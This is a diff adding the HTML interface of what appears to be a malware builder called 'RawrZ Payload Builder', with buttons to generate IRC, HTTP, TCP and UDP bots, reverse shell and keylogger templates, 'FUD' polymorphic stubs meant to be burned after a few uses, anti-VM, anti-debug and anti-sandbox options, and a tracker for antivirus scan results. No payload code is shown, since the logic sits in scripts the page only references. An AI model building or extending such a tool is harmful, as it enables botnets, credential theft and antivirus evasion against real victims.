@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ Payload Builder - UNLEASHED</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles/engine-styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 RawrZ Payload Builder - UNLEASHED 🔥</h1>
+            <p>Advanced Security Tools & Payload Generation Platform</p>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalEngines">139</div>
+                <div class="stat-label">Total Engines</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="loadedEngines">0</div>
+                <div class="stat-label">Loaded Engines</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeOperations">0</div>
+                <div class="stat-label">Active Operations</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="generatedPayloads">0</div>
+                <div class="stat-label">Generated Payloads</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="sidebar">
+                <h3>Payload Generation</h3>
+                <div class="generator-section">
+                    <h4>Output Format</h4>
+                    <select id="outputFormat">
+                        <option value="exe">Windows EXE</option>
+                        <option value="elf">Linux ELF</option>
+                        <option value="mach-o">macOS Mach-O</option>
+                        <option value="dll">Windows DLL</option>
+                        <option value="so">Linux SO</option>
+                        <option value="dylib">macOS DYLIB</option>
+                        <option value="scr">Windows SCR</option>
+                        <option value="com">DOS COM</option>
+                        <option value="bin">Raw Binary</option>
+                        <option value="hex">Intel HEX</option>
+                        <option value="srec">Motorola S-Record</option>
+                        <option value="uf2">UF2 Format</option>
+                        <option value="jar">Java JAR</option>
+                        <option value="class">Java CLASS</option>
+                        <option value="dex">Android DEX</option>
+                        <option value="apk">Android APK</option>
+                        <option value="ipa">iOS IPA</option>
+                        <option value="app">macOS APP</option>
+                        <option value="msi">Windows MSI</option>
+                        <option value="deb">Debian DEB</option>
+                        <option value="rpm">RedHat RPM</option>
+                        <option value="pkg">macOS PKG</option>
+                        <option value="dmg">macOS DMG</option>
+                        <option value="iso">ISO Image</option>
+                        <option value="vhd">Virtual Hard Disk</option>
+                    </select>
+
+                    <h4>Bot Type</h4>
+                    <div class="bot-options">
+                        <button id="ircBotGen" class="btn btn-primary">Generate IRC Bot</button>
+                        <button id="httpBotGen" class="btn btn-primary">Generate HTTP Bot</button>
+                        <button id="tcpBotGen" class="btn btn-primary">Generate TCP Bot</button>
+                        <button id="udpBotGen" class="btn btn-primary">Generate UDP Bot</button>
+                    </div>
+
+                    <h4>Encryption</h4>
+                    <label><input type="checkbox" id="useFileSSL" checked> Use FileSSL</label>
+                    <label><input type="checkbox" id="useAdvancedCrypto"> Advanced Crypto</label>
+                    <label><input type="checkbox" id="usePolymorphic"> Polymorphic</label>
+                    <label><input type="checkbox" id="useAntiAnalysis"> Anti-Analysis</label>
+                </div>
+            </div>
+
+            <div class="workspace">
+                <div class="tab-container">
+                    <button class="tab active" data-tab="files">File Operations</button>
+                    <button class="tab" data-tab="engines">Engine Control</button>
+                    <button class="tab" data-tab="payloads">Payload Builder</button>
+                </div>
+
+                <div id="files" class="tab-content active">
+                    <h3>File Operations</h3>
+                    <div class="file-controls">
+                        <button id="selectFile">Select File</button>
+                        <button id="selectFiles">Select Multiple Files</button>
+                        <button id="selectDir">Select Directory</button>
+                    </div>
+                    <div class="file-ops">
+                        <button id="hashBtn">Hash File</button>
+                        <button id="compressBtn">Compress</button>
+                        <button id="decompressBtn">Decompress</button>
+                        <button id="createArchiveBtn">Create Archive</button>
+                        <button id="extractArchiveBtn">Extract Archive</button>
+                        <button id="encryptFileBtn">Encrypt File</button>
+                        <button id="decryptFileBtn">Decrypt File</button>
+                    </div>
+
+                    <div class="jotti-section">
+                        <h4>🛡️ Jotti FUD Tracker</h4>
+                        <textarea id="jottiInput" placeholder="Paste Jotti scan results here..." rows="4"></textarea>
+                        <div class="jotti-controls">
+                            <button id="parseJottiBtn">Parse Results</button>
+                            <button id="clearJottiBtn">Clear</button>
+                        </div>
+                        <div id="jottiResults" class="jotti-results"></div>
+                        <div class="jotti-tip">💡 Tip: Copy/paste results from <a href="https://virusscan.jotti.org"
+                                target="_blank">virusscan.jotti.org</a></div>
+                    </div>
+                </div>
+
+                <div id="engines" class="tab-content">
+                    <h3>🔧 Dynamic Engine System</h3>
+                    <div class="engine-controls">
+                        <button id="loadEngines" class="btn btn-primary">Load All Engines</button>
+                    </div>
+                    <div id="engineStats">Loading engines...</div>
+                    <div id="engineToggles"></div>
+                    <div id="engineMenus"></div>
+                    <div id="engineList" class="engine-grid">
+                        <div class="engine-card">
+                            <h4>🏗️ FUD Stub Generator</h4>
+                            <p>Reusable polymorphic stubs - burn after 2-3 uses</p>
+                            <div class="stub-status" id="stubStatus">Stubs: 5 Active | 0 Burned</div>
+                            <div class="engine-controls">
+                                <button class="btn btn-primary" onclick="generateStubs()">Generate Stubs</button>
+                                <button class="btn btn-secondary"
+                                    onclick="showEngineMenu('stub-generator')">Configure</button>
+                            </div>
+                            <button class="btn btn-success" onclick="useStub()">Use Next Stub</button>
+                            <button class="btn btn-danger" onclick="burnCurrentStub()">Burn Current Stub</button>
+                            <button class="btn btn-warning" onclick="checkStubStatus()">Check Status</button>
+                        </div>
+                        <div class="engine-card">
+                            <h4>🔄 Polymorphic Engine</h4>
+                            <p>Dynamic code mutation and obfuscation</p>
+                            <button class="btn btn-primary" onclick="runPolymorphicEngine()">Run Polymorphic</button>
+                            <button class="btn btn-warning" onclick="mutateCode()">Mutate Code</button>
+                        </div>
+                        <div class="engine-card">
+                            <h4>🛡️ Anti-Analysis</h4>
+                            <p>VM detection and debugging protection</p>
+                            <button class="btn btn-danger" onclick="enableAntiAnalysis()">Enable Protection</button>
+                            <button class="btn btn-primary" onclick="testAntiAnalysis()">Test Protection</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="payloads" class="tab-content">
+                    <h3>Payload Builder</h3>
+
+                    <!-- Stub Generator Section -->
+                    <div class="stub-generator">
+                        <h4>🔥 Stub Generator</h4>
+                        <div class="stub-config">
+                            <div class="config-row">
+                                <label>Payload File:</label>
+                                <input type="text" id="stubPayloadPath" placeholder="Select payload file..." readonly>
+                                <button id="browsePayload" class="btn btn-secondary">Browse</button>
+                            </div>
+                            <div class="config-row">
+                                <label>Stub Type:</label>
+                                <select id="stubType">
+                                    <option value="cpp">C++ (.cpp)</option>
+                                    <option value="csharp">C# (.cs)</option>
+                                    <option value="python">Python (.py)</option>
+                                    <option value="powershell">PowerShell (.ps1)</option>
+                                    <option value="java">Java (.java)</option>
+                                    <option value="go">Go (.go)</option>
+                                    <option value="rust">Rust (.rs)</option>
+                                    <option value="javascript">JavaScript (.js)</option>
+                                    <option value="asm">Assembly (.asm)</option>
+                                    <option value="advanced">Advanced (.exe)</option>
+                                </select>
+                            </div>
+                            <div class="config-row">
+                                <label>Encryption:</label>
+                                <select id="stubEncryption">
+                                    <option value="aes-256-gcm">AES-256-GCM</option>
+                                    <option value="aes-256-cbc">AES-256-CBC</option>
+                                    <option value="chacha20">ChaCha20-Poly1305</option>
+                                    <option value="hybrid">Hybrid Encryption</option>
+                                    <option value="triple">Triple Layer</option>
+                                </select>
+                            </div>
+                            <div class="config-row">
+                                <label>Output Path:</label>
+                                <input type="text" id="stubOutputPath" placeholder="Output file path..." readonly>
+                                <button id="browseOutput" class="btn btn-secondary">Save As</button>
+                            </div>
+                            <div class="config-row">
+                                <label>Anti-Analysis:</label>
+                                <div class="checkbox-group">
+                                    <label><input type="checkbox" id="antiDebug" checked> Anti-Debug</label>
+                                    <label><input type="checkbox" id="antiVM" checked> Anti-VM</label>
+                                    <label><input type="checkbox" id="antiSandbox" checked> Anti-Sandbox</label>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stub-controls">
+                            <button id="testButton" class="btn btn-warning"
+                                onclick="log('🧪 Test button clicked!')">TEST</button>
+                            <button id="generateStub" class="btn btn-success">Generate Stub</button>
+                            <button id="clearStubConfig" class="btn btn-secondary">Clear</button>
+                        </div>
+                    </div>
+
+                    <hr>
+
+                    <!-- Original Payload Builder -->
+                    <div class="payload-builder">
+                        <div class="payload-config">
+                            <h4>Configuration</h4>
+                            <input type="text" id="payloadName" placeholder="Payload Name">
+                            <textarea id="payloadCode" placeholder="Enter payload code or select template"></textarea>
+                            <div class="template-buttons">
+                                <button id="ircTemplate">IRC Bot Template</button>
+                                <button id="httpTemplate">HTTP Bot Template</button>
+                                <button id="reverseShellTemplate">Reverse Shell Template</button>
+                                <button id="keyloggerTemplate">Keylogger Template</button>
+                            </div>
+                        </div>
+                        <div class="build-controls">
+                            <button id="buildPayload" class="btn btn-success">Build Payload</button>
+                            <button id="testPayload" class="btn btn-warning">Test Payload</button>
+                            <button id="downloadPayload" class="btn btn-primary">Download</button>
+                        </div>
+                    </div>
+                    
+                    <hr>
+                    
+                    <!-- Crypto Operations -->
+                    <div class="crypto-section">
+                        <h4>🔐 Crypto Operations</h4>
+                        <div class="crypto-inputs">
+                            <input type="text" id="textInput" placeholder="Enter text to encrypt/decrypt">
+                            <input type="password" id="password" placeholder="Enter password">
+                        </div>
+                        <div class="crypto-controls">
+                            <button id="encryptBtn" class="btn btn-primary">Encrypt</button>
+                            <button id="decryptBtn" class="btn btn-secondary">Decrypt</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="output">
+                    <h4>Output Console</h4>
+                    <pre id="output"></pre>
+                    <div class="output-controls">
+                        <button id="clearOutput">Clear</button>
+                        <button id="saveOutput">Save Log</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="engines/engine-config.js"></script>
+    <script src="engine-manager.js"></script>
+    <script src="renderer.js"></script>
+
+    <!-- Sovereign Beaconism Pipeline -->
+    <div id="beacon-indicator" style="position:fixed;bottom:4px;right:4px;font-size:10px;color:#0f0;background:#000;padding:2px 6px;border-radius:3px;opacity:0.8;z-index:9999;">[STEALTH_STANDBY]</div>
+    <script src="renderer-bootstrap.js"></script>
+    <script src="panels/panel-common.js"></script>
+</body>
+
+</html>
